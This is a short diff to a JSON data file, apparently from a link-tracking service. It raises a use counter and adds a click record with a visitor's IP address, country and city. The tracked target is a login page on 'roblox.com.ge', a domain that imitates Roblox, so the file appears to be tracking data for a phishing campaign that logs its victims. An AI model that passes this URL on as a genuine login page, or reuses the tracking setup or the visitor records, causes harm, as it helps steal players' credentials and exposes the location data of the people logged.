@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1573,
+    "useCount": 1574,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12752,6 +12752,14 @@
         "city": "Shwegyin",
         "flag": "🇲🇲",
         "countryCode": "MM"
+      },
+      {
+        "timestamp": 1777454581494,
+        "ip": "216.247.46.126",
+        "country": "Philippines",
+        "city": "Butuan",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
